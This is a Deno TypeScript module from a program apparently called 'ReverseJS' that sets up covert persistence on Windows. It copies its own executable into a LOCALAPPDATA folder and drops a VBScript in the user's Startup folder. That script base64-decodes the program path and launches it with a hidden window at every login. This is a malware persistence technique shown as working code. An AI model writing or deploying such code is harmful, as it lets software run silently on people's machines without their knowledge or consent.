import { join } from "https://deno.land/std@0.201.0/path/mod.ts";

const executablePath = Deno.execPath();

const exists = async (path: string) => {
  try {
    await Deno.stat(path);
    return true;
  } catch (e) {
    if (e instanceof Deno.errors.NotFound) {
      return false;
    }
    throw e;
  }
};

switch (Deno.build.os) {
  case "windows": {
    const localAppData = Deno.env.get("LOCALAPPDATA");
    const appData = Deno.env.get("APPDATA");

    if (!localAppData) {
      throw new Error("LOCALAPPDATA environment variable not set");
    } else if (!appData) {
      throw new Error("APPDATA environment variable not set");
    }

    const targetVbsPath = join(
      appData,
      "Microsoft",
      "Windows",
      "Start Menu",
      "Programs",
      "Startup",
      "ReverseJS.vbs",
    );

    const targetExecutablePath = join(
      localAppData,
      "ReverseJS",
      "ReverseJS.exe",
    );

    if (executablePath === targetExecutablePath) {
      break;
    }

    if (!await exists(join(localAppData, "ReverseJS"))) {
      await Deno.mkdir(join(localAppData, "ReverseJS"));
    }

    if (await exists(targetExecutablePath)) {
      await Deno.remove(targetExecutablePath);
    }

    // Base64Decode() & Stream_BinaryToString() from: https://stackoverflow.com/questions/496751/base64-encode-string-in-vbscript
    const launchScript = `
        Function Stream_BinaryToString(Binary)
            Const adTypeText = 2
            Const adTypeBinary = 1
            Dim BinaryStream 'As New Stream
            Set BinaryStream = CreateObject("ADODB.Stream")
            BinaryStream.Type = adTypeBinary
            BinaryStream.Open
            BinaryStream.Write Binary
            BinaryStream.Position = 0
            BinaryStream.Type = adTypeText
            BinaryStream.CharSet = "us-ascii"
            Stream_BinaryToString = BinaryStream.ReadText
            Set BinaryStream = Nothing
        End Function

        Function Base64Decode(ByVal vCode)
            Dim oXML, oNode
            Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
            Set oNode = oXML.CreateElement("base64")
            oNode.dataType = "bin.base64"
            oNode.text = vCode
            Base64Decode = Stream_BinaryToString(oNode.nodeTypedValue)
            Set oNode = Nothing
            Set oXML = Nothing
        End Function

        Set objShell = CreateObject("WScript.Shell")
        programPath = Base64Decode("${(btoa(executablePath))}")
        objShell.Run programPath, 0, False
    `;

    await Deno.copyFile(executablePath, targetExecutablePath);
    await Deno.writeTextFile(targetVbsPath, launchScript);
    break;
  }
}

postMessage("done");
